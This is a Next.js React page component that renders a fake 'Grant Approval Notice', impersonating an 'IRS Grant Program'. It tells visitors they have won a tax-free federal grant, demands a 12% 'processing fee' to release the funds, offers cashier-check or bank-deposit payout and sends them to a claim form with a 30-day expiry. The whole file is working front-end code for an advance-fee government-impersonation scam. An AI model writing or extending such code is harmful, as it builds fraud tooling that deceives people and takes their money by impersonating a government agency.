"use client"

import { Suspense, useState } from "react"
import Link from "next/link"
import { useSearchParams } from "next/navigation"
import { motion } from "framer-motion"
import { ArrowRight, DollarSign, CreditCard, Landmark, Info, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"

function WinnerContent() {
  const searchParams = useSearchParams()
  const winnerId = searchParams.get("id") || ""
  const amount = searchParams.get("amount") || "0"
  const [paymentMethod, setPaymentMethod] = useState<string>("")

  const numericAmount = Number(amount)
  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(numericAmount)

  const processingFee = numericAmount * 0.12
  const formattedFee = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(processingFee)

  return (
    <div className="min-h-[80vh]">
      <div className="bg-[#005086] text-white px-4 py-8 sm:px-6 sm:py-10">
        <div className="mx-auto max-w-2xl">
          <h1 className="text-2xl font-bold sm:text-3xl">Grant Approval Notice</h1>
          <p className="mt-2 text-sm text-blue-100/80">
            Your eligibility has been verified and approved.
          </p>
        </div>
      </div>

      <div className="mx-auto max-w-2xl px-4 py-10 sm:px-6">
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3 }}
          className="space-y-6"
        >
          {/* Approval Notice */}
          <div className="border-l-4 border-[#00a91c] bg-[#ecf3ec] p-5">
            <div className="flex items-start gap-3">
              <CheckCircle className="h-5 w-5 text-[#00a91c] mt-0.5 shrink-0" />
              <div>
                <h2 className="text-lg font-bold text-[#1b1b1b]">Congratulations — You Have Been Selected</h2>
                <p className="mt-1 text-sm text-[#5c5c5c]">
                  You have been approved to receive a federal grant through the IRS Grant Program.
                </p>
              </div>
            </div>
          </div>

          {/* Amount Card */}
          <div className="border border-[#dfe1e2] bg-[#f7f7f7] p-6 rounded-sm">
            <div className="flex items-center gap-2 text-[#5c5c5c] mb-2">
              <DollarSign className="h-4 w-4" />
              <span className="text-xs font-bold uppercase tracking-widest">Your Approved Grant Amount</span>
            </div>
            <div className="text-4xl font-bold text-[#005086] sm:text-5xl">
              {formattedAmount}
            </div>
            <p className="mt-2 text-xs text-[#5c5c5c]">
              Tax-free federal grant &middot; No repayment required
            </p>
          </div>

          {/* 12% Processing Fee Notice */}
          <div className="border-l-4 border-[#005ea2] bg-[#e8f0fa] p-5">
            <div className="flex items-start gap-3">
              <Info className="h-5 w-5 text-[#005ea2] mt-0.5 shrink-0" />
              <div>
                <h3 className="text-sm font-bold text-[#1b1b1b] mb-1">Processing Fee Required</h3>
                <p className="text-sm text-[#5c5c5c] leading-relaxed">
                  A one-time processing fee of <strong>12%</strong> ({formattedFee}) is required to release your grant funds.
                  This fee covers administrative processing, federal verification, and secure fund transfer.
                </p>
              </div>
            </div>
          </div>

          {/* Payment Method Selection */}
          <div>
            <h3 className="mb-2 text-sm font-bold text-[#1b1b1b]">Select Payment Method</h3>
            <p className="mb-4 text-sm text-[#5c5c5c]">Choose how you would like to receive your grant funds.</p>
            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => setPaymentMethod("cashier_check")}
                className={`relative border p-5 text-center transition-all rounded-sm ${
                  paymentMethod === "cashier_check"
                    ? "border-[#005ea2] bg-[#e8f0fa] ring-1 ring-[#005ea2]"
                    : "border-[#dfe1e2] hover:border-[#aaacae] bg-white"
                }`}
              >
                {paymentMethod === "cashier_check" && (
                  <div className="absolute -top-2 -right-2 flex h-5 w-5 items-center justify-center rounded-full bg-[#005ea2] text-white">
                    <CheckCircle className="h-3 w-3" />
                  </div>
                )}
                <CreditCard className="mx-auto mb-2 h-6 w-6 text-[#005086]" />
                <div className="text-sm font-bold text-[#1b1b1b]">Cashier Check</div>
                <div className="mt-0.5 text-[11px] text-[#5c5c5c]">Mailed to your address</div>
              </button>
              <button
                type="button"
                onClick={() => setPaymentMethod("electronic_deposit")}
                className={`relative border p-5 text-center transition-all rounded-sm ${
                  paymentMethod === "electronic_deposit"
                    ? "border-[#005ea2] bg-[#e8f0fa] ring-1 ring-[#005ea2]"
                    : "border-[#dfe1e2] hover:border-[#aaacae] bg-white"
                }`}
              >
                {paymentMethod === "electronic_deposit" && (
                  <div className="absolute -top-2 -right-2 flex h-5 w-5 items-center justify-center rounded-full bg-[#005ea2] text-white">
                    <CheckCircle className="h-3 w-3" />
                  </div>
                )}
                <Landmark className="mx-auto mb-2 h-6 w-6 text-[#005086]" />
                <div className="text-sm font-bold text-[#1b1b1b]">Electronic Deposit</div>
                <div className="mt-0.5 text-[11px] text-[#5c5c5c]">Direct to your bank</div>
              </button>
            </div>
          </div>

          {/* CTA */}
          <div className="pt-2">
            {paymentMethod ? (
              <Button asChild size="lg" className="w-full rounded-sm bg-[#005ea2] hover:bg-[#1a4480] text-white">
                <Link href={`/claim?id=${winnerId}&amount=${amount}&method=${paymentMethod}`}>
                  Continue to Claim Form
                  <ArrowRight className="ml-2 h-4 w-4" />
                </Link>
              </Button>
            ) : (
              <Button size="lg" className="w-full rounded-sm bg-[#aaacae] text-white cursor-not-allowed" disabled>
                Select a Payment Method to Continue
              </Button>
            )}
            <p className="mt-3 text-center text-[11px] text-[#5c5c5c]">
              Complete your claim form to receive your funds. This offer expires in 30 days.
            </p>
          </div>
        </motion.div>
      </div>
    </div>
  )
}

export default function WinnerPage() {
  return (
    <Suspense fallback={<div className="min-h-[80vh] flex items-center justify-center"><p>Loading...</p></div>}>
      <WinnerContent />
    </Suspense>
  )
}
